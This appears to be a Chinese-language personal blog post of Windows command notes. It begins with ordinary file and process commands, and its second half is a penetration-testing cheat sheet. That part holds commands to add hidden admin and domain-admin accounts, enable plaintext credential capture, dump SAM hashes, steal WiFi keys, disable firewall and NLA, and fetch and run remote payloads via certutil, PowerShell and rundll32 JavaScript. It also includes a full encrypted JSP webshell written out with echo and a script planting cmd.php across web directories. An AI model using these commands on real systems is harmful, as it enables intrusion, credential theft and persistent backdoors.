---
title: windows常用命令
subtitle:
date: 2024-08-15T09:31:01+08:00
slug: 90
draft:  false
author: 
  name: 东隅
  link:
  email: 735587142@qq.com
  avatar: 
description:
keywords:
license:
comment: false
weight: 0
tags:
  - 计算机基础
  - 操作系统
categories:
  - 计算机基础
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRss: false
hiddenFromRelated: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter

---

<!--more-->

# 文件&目录

## 读文件

```
type 命令：
用法：type 文件路径
示例：type C:\path\to\file.txt
作用：显示文件的内容。


more 命令：
用法：more 文件路径
示例：more C:\path\to\file.txt
作用：逐页显示文件的内容，按空格键显示下一页，按回车键显示下一行。

find 命令：
用法：find "要查找的字符串" 文件路径
示例：find "Hello" C:\path\to\file.txt
作用：在文件中查找指定字符串，并显示匹配的行。

powershell 命令：
用法：powershell Get-Content -Path 文件路径
示例：powershell Get-Content -Path C:\path\to\file.txt
作用：使用 PowerShell 命令获取文件的内容，与type命令类似。
```

## 写文件

```
echo 命令：
用法：echo 内容 > 文件路径
示例：echo Hello, World! > C:\path\to\file.txt
作用：将指定的内容写入文件。如果文件不存在，则创建新文件；如果文件已存在，则覆盖原有内容。

echo 命令（追加模式）：
用法：echo 内容 >> 文件路径
示例：echo New line >> C:\path\to\file.txt
作用：将指定的内容追加到文件末尾。如果文件不存在，则创建新文件。

copy con 命令（逐行写入）：
用法：copy con 文件路径
示例：copy con C:\path\to\file.txt
作用：以逐行的方式从键盘输入内容，并将输入的内容写入文件。按 Ctrl + Z 组合键结束输入。

powershell 命令：
用法：powershell Set-Content -Path 文件路径 -Value 内容
示例：powershell Set-Content -Path C:\path\to\file.txt -Value "Hello, World!"
作用：使用 PowerShell 命令将指定的内容写入文件。如果文件不存在，则创建新文件；如果文件已存在，则覆盖原有内容。
```

## 找文件

```
dir 命令：
用法：dir /s 文件名
示例：dir /s myfile.txt
作用：在当前目录及其子目录下递归搜索指定文件名的文件，并列出匹配的文件路径。

where 命令：
用法：where 文件名
示例：where myfile.txt
作用：在系统的可执行文件路径中搜索指定文件名，并列出匹配的文件路径。

find 命令：
用法：find /i "文件名" 目录路径
示例：find /i "myfile.txt" C:\path\to\directory
作用：在指定目录下递归搜索指定文件名的文件，并显示匹配的文件路径。

powershell 命令：
用法：powershell Get-ChildItem -Path 目录路径 -Filter "文件名" -Recurse
示例：powershell Get-ChildItem -Path C:\path\to\directory -Filter "myfile.txt" -Recurse
作用：使用 PowerShell 命令在指定目录下递归搜索指定文件名的文件，并列出匹配的文件路径。
```

## 找内容

```
findstr 命令：
用法：findstr /s /i /c:"fla" C:\
作用：在根目录 C:\ 下递归搜索文件内容，并匹配包含 "fla" 的文本行。
参数说明：
/s：递归地在子目录中搜索文件。
/i：忽略大小写进行匹配。
/c:"fla"：指定要搜索的文本字符串。

dir 命令和 find 命令的组合：
用法：dir C:\ /s /b | find /i "fla"
作用：在根目录 C:\ 下递归搜索文件，并匹配包含 "fla" 的文件路径。
参数说明：
dir C:\ /s /b：递归地列出根目录 C:\ 下的所有文件路径。
|：将 dir 命令的输出作为 find 命令的输入。
find /i "fla"：在输入中查找包含 "fla" 的行。
```

## 读目录

```
dir 命令：
用法：dir 目录路径
示例：dir C:\path\to\directory
作用：列出指定目录下的文件和子目录。

tree 命令：
用法：tree 目录路径
示例：tree C:\path\to\directory
作用：以树状结构显示指定目录及其子目录的文件和子目录。

powershell 命令：
用法：powershell Get-ChildItem -Path 目录路径
示例：powershell Get-ChildItem -Path C:\path\to\directory
作用：使用 PowerShell 命令列出指定目录下的文件和子目录。
```

## 删文件

```
del 命令：
用法：del 文件路径
示例：del C:\path\to\file.txt
作用：删除指定的文件。

erase 命令：
用法：erase 文件路径
示例：erase C:\path\to\file.txt
作用：删除指定的文件。

del /f 命令（强制删除）：
用法：del /f 文件路径
示例：del /f C:\path\to\file.txt
作用：强制删除指定的文件，即使文件是只读或系统文件。

del /p 命令（提示确认）：
用法：del /p 文件路径
示例：del /p C:\path\to\file.txt
作用：删除指定的文件之前，会提示你确认是否删除。

del /f "Endpoint Security"
```

## 删目录

```
rmdir 命令：
用法：rmdir /s /q 目录路径
示例：rmdir /s /q C:\path\to\directory
作用：删除指定目录及其子目录中的所有文件和子目录。
参数说明：
/s：递归地删除目录及其子目录中的文件和子目录。
/q：安静模式，不要求确认删除操作。

rd 命令：
用法：rd /s /q 目录路径
示例：rd /s /q C:\path\to\directory
作用：删除指定目录及其子目录中的所有文件和子目录。
参数说明：
/s：递归地删除目录及其子目录中的文件和子目录。
/q：安静模式，不要求确认删除操作。
```

## 创建文件&目录

```
创建文件：

echo 命令：
用法：echo. > 文件路径
示例：echo. > C:\path\to\file.txt
作用：创建一个空文件。
注意：echo. 后面的空格是必需的。

type nul 命令：
用法：type nul > 文件路径
示例：type nul > C:\path\to\file.txt
作用：创建一个空文件。

创建目录：

mkdir 命令：
用法：mkdir 目录路径
示例：mkdir C:\path\to\directory
作用：创建一个新的目录。

md 命令：
用法：md 目录路径
示例：md C:\path\to\directory
作用：创建一个新的目录。
```



# 进程

1. tasklist：显示当前系统上运行的所有进程的列表。

   ```
   tasklist
   ```

2. taskkill：终止指定的进程。

   ```
   taskkill /PID <PID>
   taskkill /F /PID <PID> qi
   ```

3. wmic process：使用 Windows 管理控制台 (WMI) 查询和管理进程信息。

   ```
   wmic process get Caption,ProcessId,CommandLine
   ```

4. sc：用于管理 Windows 服务，包括启动、停止和查询服务进程。

   ```
   sc query
   sc start <service_name>
   sc stop <service_name>
   ```

5. netstat：显示与网络连接相关的进程信息。

   ```
   netstat -ano
   ```

6. pslist：Sysinternals Suite 中的工具，用于显示详细的进程信息，包括进程的父子关系、线程信息等。

   ```
   pslist
   ```

7. handle：Sysinternals Suite 中的工具，用于查找打开文件、注册表项等的进程。

   ```
   handle <file_path>
   ```



# 渗透命令

#### [1. net命令](https://book.shentoushi.top/Info/Win_info.html#1-net命令)

```
查看用户列表: net user

powershell查看用户列表: Get-WmiObject -Class Win32_UserAccount

查看用户组列表: net localgroup

查看管理组列表: net localgroup Administrators

添加用户并设置密码: net user ASP.NET P@ssw0rd /add

将用户加入管理组: net localgroup Administrators ASP.NET /add

将用户加入桌面组: net localgroup "Remote Desktop Users" guest /add

激活guest用户: net user guest /active:yes

更改guest用户的密码: net user guest P@ssw0rd

将用户加入管理组: net localgroup administrators guest /add

将用户加入桌面组: net localgroup "Remote Desktop Users" guest /add

查看本地密码策略: net accounts

查看当前会话: net session

建立IPC会话: net use \\127.0.0.1\c$ "P@ssw0rd" /user:"domain\Administrator"
```

#### [2. 域渗透命令](https://book.shentoushi.top/Info/Win_info.html#2-域渗透命令)

```
查看当前用户权限: whoami /user

可知域名为和其他信息: net config workstation

查询域用户：net user /domain

添加域用户: net user ASP.NET Admin12345 /add /domain

添加域管理员: net group "domain admins" ASP.NET /add /domain

添加企业管理员: net group "enterprise admins" /add /domain

查询域管理员用户：net group "domain admins" /domain

查询域企业管理组: net group "enterprise admins" /domain

查询域本地管理组: net localgroup administrators /domain

查询域控制器和时间：net time /domain

查询域名称：net view /domain

查询域内计算机：net view /domain:redteam.local

查看当前域内计算机列表: net group "domain computers" /domain

查看域控机器名: net group "domain controllers" /domain

查看域密码策略: net accounts /domain

查看域信任: nltest /domain_trusts

查看某个域的域信任: nltest /domain_trusts /all_trusts /v /server:10.10.10.10

通过srv记录: nslookup -type=SRV _ldap._tcp.corp
```

#### [3. 信息收集命令](https://book.shentoushi.top/Info/Win_info.html#3-信息收集命令)

```
查看当前用户的安全特权: whoami /priv

查看当前用户: whoami /user

查看当前登陆用户: query user && quser

查看系统版本和补丁信息: systeminfo

查看系统开放端口: netstat -ano

查看系统进程: tasklist /svc

列出详细进程: tasklist /V && tasklist /V /FO CSV

查看ip地址和dns信息: ipconfig /all

查看当前用户保存的凭证: cmdkey /list

查看路由信息:route print

查看arp列表: arp -a

查看当前用户保存的票据凭证: klist
```

- 列出c盘Users文件夹:

```
dir /b c:\Users
```

- 搜索D盘磁盘名字为logo.jpg的文件:

```
cd /d D:\ && dir /b /s logo.jpg
```

- 搜素C盘文件夹下后缀conf内容有password:

```
findstr /s /i /n /d:C:\ "password" *.conf
```

- 查找Windows目录下面的Bluetooth.dll文件:

```
where /R C:\windows Bluetooth.dll
```

- 查看3389端口:

```
for /f "tokens=2" %i in ('tasklist /FI "SERVICES eq TermService" /NH') do netstat -ano | findstr %i | findstr LISTENING
```

- Windows存储的凭证:

```
rundll32 keymgr.dll,KRShowKeyMgr
```

#### [4.注册表相关](https://book.shentoushi.top/Info/Win_info.html#4注册表相关)

1. LocalAccountTokenFilterPolicy-启用任何管理员用户横向

```
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

1. 查看3389端口:

```
REG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber
```

1. 开启远程桌面:

```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
```

1. 注册表抓取明文:

```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

1. rdp连接默认的10个记录:

```
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"
```

1. rdp连接默认的所有记录:

```
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s
```

1. 查找软件安装目录:

```
reg query HKLM /f foxmail /t REG_SZ /s
```

1. reg导出注册表hash:

```
reg save hklm\sam c:\programdata\sam.hive && reg save hklm\system c:\programdata\system.hive
```

1. hash登录利用“Restricted Admin Mode“特性:

- 新建DWORD键值DisableRestrictedAdmin，值为0，代表开启;值为1，代表关闭

```
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
```

- 查看是否开启DisableRestrictedAdmin REG_DWORD 0x0 存在就是开启

```
REG query "HKLM\System\CurrentControlSet\Control\Lsa" | findstr "DisableRestrictedAdmin"
```

- 然后如果hash正确就可以登录目标主机

```
mstsc.exe /restrictedadmin
```

1. CredSSP 加密数据库修正:

```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters" /f /v AllowEncryptionOracle /t REG_DWORD /d 2
```

1. 取消仅允许运行使用网络识别身份验证的远程桌面的计算机连接(NLA):

```
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /f /d 0
```

#### [5. 系统下载文件:](https://book.shentoushi.top/Info/Win_info.html#5-系统下载文件)

1. windows2003默认文件:

```
Blob0_0.bin //可以正常执行
```

1. certutil下载文件:

```
certutil -urlcache -split -f http://127.0.0.1:8080/nc.txt c:\nc.txt
```

2.1 certutil删除记录:

```
certutil -urlcache -split -f http://127.0.0.1:8080/nc.txt delete
```

1. bitsadmin下载文件:

```
bitsadmin /rawreturn /transfer getfile http://download.sysinternals.com/files/PSTools.zip c:\Pstools.zip
```

1. powershell下载文件:

```
powershell -nop -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://127.0.0.1/nc.txt','nc.exe')
```

1. msedge下载并执行:

```
cmd /c start /min msedge.exe http://127.0.0.1/test.zip && timeout 5 && taskkill /f /t /im msedge.exe && C:/Users/%UserName%/Downloads/test.zip
```

1. rundll32下载文件

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.3.150/chfs/shared/1Z3.exe",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
```

#### [设置网卡netsh和防火墙信息](https://book.shentoushi.top/Info/Win_info.html#设置网卡netsh和防火墙信息)

查看网卡信息

```
netsh interface show interface
```

设置主dns

```
netsh interface ip set dns "以太网" static 114.114.114.114 primary
```

设置备dns

```
netsh interface ip add dns "以太网" 8.8.8.8
```

查看防火墙状态

```
netsh advfirewall show allprofiles
```

防火墙恢复默认配置

```
netsh firewall reset
```

开启防火墙

```
netSh Advfirewall set allprofiles state on
```

关闭防火墙

```
netSh Advfirewall set allprofiles state off
```

放行3389端口

```
netsh advfirewall firewall add rule name=3389_test dir=in action=allow protocol=TCP localport=3389
```

#### [查看本机WiFi信息和配置](https://book.shentoushi.top/Info/Win_info.html#查看本机wifi信息和配置)

- 查看当前用户wifi配置文件

```
netsh wlan show profiles
```

- 查看当前连接的wifi

```
netsh wlan show interface
```

- 查看本机WiFi配置和密码:

```
netsh wlan show profile "ssid" key=clear
```

- 枚举所有连接过的wifi:

```
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
```

- 连接他配置文件的其它wifi

```
netsh wlan connect name=ssid
```

- 文件上传

```
curl -k --upload-file win.exe https://transfer.sh --progress-bar
```

- sc命令

```
创建服务: sc \\127.0.0.1 create Emeripe binPath= "cmd.exe /c start c:\programdata\info.bat"
启动服务: sc \\127.0.0.1 start Emeripe
删除服务: sc \\127.0.0.1 delete Emeripe
```

- 远程桌面登录到 console 会话解决 hash 无法抓出问题

```
mstsc /admin
```

- 将用户会话连接到远程桌面会话

```
tscon ID(quser)
```

- 根据进程名字终止进程:

```
taskkill /f /t /im msedge.exe
```

- 根据进程pid终止进程:

```
taskkill /f /pid 17676
```

- tasklist查看远程主机进程:

```
tasklist /s 192.168.3.200 /u Aadministrator /p Password
tasklist /s 192.168.3.110 /u offensive\administrator /P Password /V
```

- runas启动其它用户进程:

```
runas /user:administrator /savecred "cmd.exe /k whoami"
```

- `windows开机启动路径`

```
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```



# Websecurity命令收集

- `cmd下转义写马问题`

```
echo ^<%! String xc=\"d8ea7326e6ec5916\"; String pass=\"pass123\"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(\"AES\");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),\"AES\"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(\"MD5\");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName(\"java.util.Base64\");Object Encoder = base64.getMethod(\"getEncoder\", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(\"encodeToString\", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(\"sun.misc.BASE64Encoder\"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(\"encode\", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName(\"java.util.Base64\");Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(\"decode\", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(\"sun.misc.BASE64Decoder\"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(\"decodeBuffer\", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%^>^<%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute(\"payload\")==null){session.setAttribute(\"payload\",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute(\"parameters\",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(\"payload\")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%^> >/tomcat/webapps/ROOT/1.jsp
```

- `网站路径中文问题 递归搜索E盘的index.php然后输出到1.txt然后把cmd.php复制到文件1.txt路径所在目录`

```
dir /s /b E:\index.php > E:\www\1.txt && (for /f "usebackq delims=" %a in ("E:\www\1.txt") do (copy E:\www\cmd.php "%~dpa"))
```

- `查找1.jpg路径把111.txt写到jpg目录`

```
find / -name 1.jpg|while read file;do sh -c "echo '111'">$(dirname $file)/111.txt;done
```

- `mssql查找数据库配置文件`

```
findstr /c:"User Id=" /c:"Password=" /si web.config >> tmp.log
findstr /c:"uid=" /c:"Password=" /si web.config >> tmp.log
```







